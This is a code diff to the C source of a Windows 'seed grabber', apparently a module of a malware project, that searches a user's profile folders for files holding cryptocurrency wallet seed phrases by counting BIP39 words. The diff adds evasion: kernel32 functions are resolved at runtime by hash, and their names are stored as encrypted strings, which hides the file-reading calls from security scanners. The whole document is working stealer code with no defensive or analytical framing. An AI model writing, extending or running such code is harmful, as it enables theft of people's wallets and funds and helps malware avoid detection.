@@ -1,5 +1,9 @@
 #include "seed_grabber.h"
 #include "config.h"
+#include "peb.h"
+#include "export_resolve.h"
+#include "hash.h"
+#include "enc_strings.h"
 #include <windows.h>
 
 #ifdef ENABLE_SEED_PHRASE_GRABBER
@@ -10,6 +14,78 @@
 #define SEED_MAX_PATH 512
 #define SEED_READ_BUF (64 * 1024)
 #define SEED_MAX_PHRASES 64
+
+/* ── API function pointer types (kernel32.dll) ──────────────────── */
+
+typedef HANDLE (WINAPI *pFindFirstFileA_sg)(LPCSTR, LPWIN32_FIND_DATAA);
+typedef BOOL   (WINAPI *pFindNextFileA_sg)(HANDLE, LPWIN32_FIND_DATAA);
+typedef BOOL   (WINAPI *pFindClose_sg)(HANDLE);
+typedef HANDLE (WINAPI *pCreateFileA_sg)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+typedef BOOL   (WINAPI *pReadFile_sg)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+typedef BOOL   (WINAPI *pCloseHandle_sg)(HANDLE);
+typedef DWORD  (WINAPI *pGetFileSize_sg)(HANDLE, LPDWORD);
+typedef HANDLE (WINAPI *pGetProcessHeap_sg)(void);
+typedef LPVOID (WINAPI *pHeapAlloc_sg)(HANDLE, DWORD, SIZE_T);
+typedef BOOL   (WINAPI *pHeapFree_sg)(HANDLE, DWORD, LPVOID);
+
+/* ── Resolved API pointers ──────────────────────────────────────── */
+
+static struct {
+    pFindFirstFileA_sg  pFF;
+    pFindNextFileA_sg   pFN;
+    pFindClose_sg       pFC;
+    pCreateFileA_sg     pCreateFile;
+    pReadFile_sg        pReadFile;
+    pCloseHandle_sg     pCloseHandle;
+    pGetFileSize_sg     pGetFileSize;
+    pGetProcessHeap_sg  pGetHeap;
+    pHeapAlloc_sg       pAlloc;
+    pHeapFree_sg        pFree;
+    int                 ready;
+} sg_api;
+
+static void *sg_resolve(void *mod, const char *name) {
+    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
+}
+
+static int sg_ensure_api(void) {
+    if (sg_api.ready) return 1;
+
+    char dll[32], fn[32];
+    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+
+    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
+    sg_api.pFF = (pFindFirstFileA_sg)sg_resolve(k32, fn);
+    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
+    sg_api.pFN = (pFindNextFileA_sg)sg_resolve(k32, fn);
+    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
+    sg_api.pFC = (pFindClose_sg)sg_resolve(k32, fn);
+    enc_decrypt(enc_CreateFileA, ENC_CREATEFILEA_LEN, fn);
+    sg_api.pCreateFile = (pCreateFileA_sg)sg_resolve(k32, fn);
+    enc_decrypt(enc_ReadFile, ENC_READFILE_LEN, fn);
+    sg_api.pReadFile = (pReadFile_sg)sg_resolve(k32, fn);
+    enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn);
+    sg_api.pCloseHandle = (pCloseHandle_sg)sg_resolve(k32, fn);
+    enc_decrypt(enc_GetFileSize, ENC_GETFILESIZE_LEN, fn);
+    sg_api.pGetFileSize = (pGetFileSize_sg)sg_resolve(k32, fn);
+    enc_decrypt(enc_GetProcessHeap, ENC_GETPROCESSHEAP_LEN, fn);
+    sg_api.pGetHeap = (pGetProcessHeap_sg)sg_resolve(k32, fn);
+    enc_decrypt(enc_HeapAlloc, ENC_HEAPALLOC_LEN, fn);
+    sg_api.pAlloc = (pHeapAlloc_sg)sg_resolve(k32, fn);
+    enc_decrypt(enc_HeapFree, ENC_HEAPFREE_LEN, fn);
+    sg_api.pFree = (pHeapFree_sg)sg_resolve(k32, fn);
+
+    if (!sg_api.pFF || !sg_api.pFN || !sg_api.pFC ||
+        !sg_api.pCreateFile || !sg_api.pReadFile || !sg_api.pCloseHandle ||
+        !sg_api.pGetFileSize || !sg_api.pGetHeap || !sg_api.pAlloc ||
+        !sg_api.pFree)
+        return 0;
+
+    sg_api.ready = 1;
+    return 1;
+}
 
 /* ── BIP39 English wordlist (2048 words, sorted) ─────────────── */
 
@@ -295,7 +371,6 @@ static int count_bip39_in_text(const char *text, int *match_count) {
     memcpy(buf, text, len);
     buf[len] = '\0';
 
-    /* lowercase */
     for (size_t i = 0; i < len; i++)
         buf[i] = (char)tolower((unsigned char)buf[i]);
 
@@ -327,13 +402,14 @@ static int has_target_ext(const char *name) {
 
 int seed_grabber_scan(const char *dir, char *output, size_t outlen) {
     if (!dir || !output || outlen == 0) return -1;
+    if (!sg_ensure_api()) return -1;
     output[0] = '\0';
 
     char pattern[SEED_MAX_PATH];
     snprintf(pattern, sizeof(pattern), "%s\\*", dir);
 
     WIN32_FIND_DATAA fd;
-    HANDLE hFind = FindFirstFileA(pattern, &fd);
+    HANDLE hFind = sg_api.pFF(pattern, &fd);
     if (hFind == INVALID_HANDLE_VALUE) return -1;
 
     size_t pos = 0;
@@ -344,32 +420,31 @@ int seed_grabber_scan(const char *dir, char *output, size_t outlen) {
         char filepath[SEED_MAX_PATH];
         snprintf(filepath, sizeof(filepath), "%s\\%s", dir, fd.cFileName);
 
-        /* Read file */
-        HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
-                                   NULL, OPEN_EXISTING, 0, NULL);
+        HANDLE hFile = sg_api.pCreateFile(filepath, GENERIC_READ, FILE_SHARE_READ,
+                                          NULL, OPEN_EXISTING, 0, NULL);
         if (hFile == INVALID_HANDLE_VALUE) continue;
 
-        DWORD fileSize = GetFileSize(hFile, NULL);
+        DWORD fileSize = sg_api.pGetFileSize(hFile, NULL);
         if (fileSize == INVALID_FILE_SIZE || fileSize == 0 || fileSize > SEED_READ_BUF - 1) {
-            CloseHandle(hFile);
+            sg_api.pCloseHandle(hFile);
             continue;
         }
 
-        char *buf = (char *)HeapAlloc(GetProcessHeap(), 0, fileSize + 1);
-        if (!buf) { CloseHandle(hFile); continue; }
+        char *buf = (char *)sg_api.pAlloc(sg_api.pGetHeap(), 0, fileSize + 1);
+        if (!buf) { sg_api.pCloseHandle(hFile); continue; }
 
         DWORD read = 0;
-        BOOL ok = ReadFile(hFile, buf, fileSize, &read, NULL);
-        CloseHandle(hFile);
+        BOOL ok = sg_api.pReadFile(hFile, buf, fileSize, &read, NULL);
+        sg_api.pCloseHandle(hFile);
         if (!ok || read == 0) {
-            HeapFree(GetProcessHeap(), 0, buf);
+            sg_api.pFree(sg_api.pGetHeap(), 0, buf);
             continue;
         }
         buf[read] = '\0';
 
         int matches = 0;
         count_bip39_in_text(buf, &matches);
-        HeapFree(GetProcessHeap(), 0, buf);
+        sg_api.pFree(sg_api.pGetHeap(), 0, buf);
 
         if (matches >= 12) {
             int wrote = snprintf(output + pos, outlen - pos, "%s (%d words)\n",
@@ -379,9 +454,9 @@ int seed_grabber_scan(const char *dir, char *output, size_t outlen) {
             else
                 break;
         }
-    } while (FindNextFileA(hFind, &fd));
+    } while (sg_api.pFN(hFind, &fd));
 
-    FindClose(hFind);
+    sg_api.pFC(hFind);
     return 0;
 }
 
@@ -389,6 +464,7 @@ int seed_grabber_scan(const char *dir, char *output, size_t outlen) {
 
 int seed_grabber_collect(char *output, size_t outlen) {
     if (!output || outlen == 0) return -1;
+    if (!sg_ensure_api()) return -1;
     output[0] = '\0';
 
     const char *home = getenv("USERPROFILE");
